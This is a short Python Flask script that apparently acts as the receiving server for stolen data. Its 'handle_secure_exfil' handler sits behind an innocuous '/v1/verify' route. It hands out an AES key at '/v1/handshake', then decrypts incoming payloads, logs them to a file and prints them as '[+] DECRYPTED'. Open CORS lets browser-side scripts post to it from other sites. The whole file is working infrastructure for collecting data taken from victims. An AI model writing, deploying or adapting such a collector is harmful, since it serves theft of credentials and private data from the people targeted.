import os
import datetime
import base64
import secrets
import string
from flask import Flask, request, jsonify
from flask_cors import CORS
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

app = Flask(__name__)
CORS(app)

LOG_FILE = "forensic_log.txt"
ARCHIVE_DIR = "archive"
PORT = 8080

current_session_key = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
current_session_iv = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))

def rotate_logs():
    if not os.path.exists(ARCHIVE_DIR):
        os.makedirs(ARCHIVE_DIR)
    if os.path.exists(LOG_FILE):
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        os.rename(LOG_FILE, os.path.join(ARCHIVE_DIR, f"log_{ts}.txt"))
    with open(LOG_FILE, "w") as f:
        f.write(f"--- SESSION START: {datetime.datetime.now()} ---\n")

@app.route('/v1/handshake', methods=['GET'])
def handshake():
    return jsonify({
        "k": current_session_key,
        "i": current_session_iv
    }), 200

@app.route('/v1/verify', methods=['POST'])
def handle_secure_exfil():
    data = request.json
    ciphertext = data.get('payload', '')
    
    try:
        raw_cipher = base64.b64decode(ciphertext)
        key_bytes = current_session_key.encode('utf-8')
        iv_bytes = current_session_iv.encode('utf-8')
        
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        decrypted = unpad(cipher.decrypt(raw_cipher), AES.block_size).decode('utf-8')
        
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.datetime.now()}] {decrypted}\n")
        
        print(f"\033[92m[+] DECRYPTED:\033[0m {decrypted}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    rotate_logs()
    app.run(host='0.0.0.0', port=PORT)